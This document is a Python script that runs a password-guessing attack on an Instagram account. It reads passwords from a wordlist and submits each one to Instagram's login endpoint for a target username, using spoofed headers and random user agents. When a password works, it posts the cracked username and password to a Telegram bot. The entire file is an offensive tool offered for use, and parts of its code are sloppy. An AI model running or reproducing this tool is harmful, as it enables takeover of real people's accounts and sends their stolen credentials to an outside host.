import requests, random, pyfiglet, os
from user_agent import generate_user_agent

try:
    import requests, random, pyfiglet, os
    from user_agent import generate_user_agent
except ImportError:
    os.system("pip install requests")
    os.system("pip install random")
    os.system("pip install pyfiglet")
    os.system("pip install os")
    os.system("pip install user_agent")
    
    os.system("clear")

#--------------------------------
Black = "\033[1;30m"       #Black
Red = "\033[1;31m"         #Red
Green = "\033[1;32m"       #Green
Yellow = "\033[1;33m"      #Yellow
Blue = "\033[1;34m"        #Blue
Purple = "\033[1;35m"      #Purple
Cyan = "\033[1;36m"        #Cyan
White = "\033[1;37m"       #White
Gray = "\033[1;39m"        #Gray
DarkRed = "\033[2;31m"     #Dark Red
DarkBlue = "\033[2;34m"    #Drak Blue
DarkPink = "\033[2;35m"    #Dark Pink
DarkCyan = "\033[2;36m"    #Dark Cyan
#--------------------------------

logo = pyfiglet.figlet_format("G00TR-IG")
print(Blue+logo)
print("\033[1;37mThis Tool Was Programmed By : TLER AL-BISHI \nWebsite For All Accs : \033[1;34mhttps://linktr.ee/tler.sa")
print("\033[1;37m- "*25)

option  = input("Do You Want To Send Info To The Telegram? \033[1;37m(\033[1;33mY\033[1;37m/\033[1;33mN\033[1;37m) \033[1;33m")
if option == "Y":
    ID = input("\033[1;37m[\033[1;33m1\033[1;37m] - \033[1;31mEnter Your ID \033[1;37m: \033[1;31m")
    token = input("\033[1;37m[\033[1;33m2\033[1;37m] - \033[1;31mEnter Your Token BOT \033[1;37m: \033[1;31m")

if option == "N":
    print("\033[1;37mNo Problem \033[1;34m:) \033[1;37m...")

else:
    print("\033[1;31mPlease Choose \033[1;37m(\033[1;33mY\033[1;37m/\033[1;33mN\033[1;37m)!")

r = requests.Session()

filee = input("\033[1;37m[\033[1;36m+\033[1;37m] - \033[1;36mEnter Name File \033[1;37m: \033[1;36m")
rfile = open(filee, "r")
us = input("\033[1;37m[\033[1;33m+\033[1;37m] - \033[1;31mEnter Username Target \033[1;37m: \033[1;31m")

while True:
    username = us
    password = rfile.readline().split("\n")[0]

    url = 'https://www.instagram.com/accounts/login/ajax/'
    headers = {'accept':'*/*',
         'accept-encoding':'gzip,deflate,br',
         'accept-language':'en-US,en;q=0.9,ar;q=0.8',
         'content-length':'269',
         'content-type':'application/x-www-form-urlencoded',
         'cookie':'ig_did=77A45489-9A4C-43AD-9CA7-FA3FAB22FE24;ig_nrcb=1;csrftoken=VOPH7fUUOP85ChEViZkd2PhLkUQoP8P8;mid=YGwlfgALAAEryeSgDseYghX2LAC-',
         'origin':'https://www.instagram.com',
         'referer':'https://www.instagram.com/',
         'sec-fetch-dest':'empty',
         'sec-fetch-mode':'cors',
         'sec-fetch-site':'same-origin',
         'user-agent': generate_user_agent(),
         'x-csrftoken':'VOPH7fUUOP85ChEViZkd2PhLkUQoP8P8',
         'x-ig-app-id':'936619743392459',
         'x-ig-www-claim':'0',
         'x-instagram-ajax':'8a8118fa7d40',
         'x-requested-with':'XMLHttpRequest'}         
    data = {
        'username': username,
        'enc_password':'#PWD_INSTAGRAM_BROWSER:0:1589682409:{}'.format(password),
        'queryParams':'{}',
        'optIntoOneTap':'false'}
    req_login = r.post(url, headers=headers, data=data, proxies=None)

    if 'userId' in req_login.text:
        print("\033[1;32mUser name \033[1;37m: \033[1;31m"+username+"\n\033[1;32mPassword \033[1;37m: \033[1;31m"+password)
        tlg = (f'https://api.telegram.org/bot{token}/sendMessage?chat_id={ID}&text={username}{password}')
        i = requests.post(tlg)
        break

    else:
        print("\033[1;31mError \033[1;37m: \033[1;31m"+password)
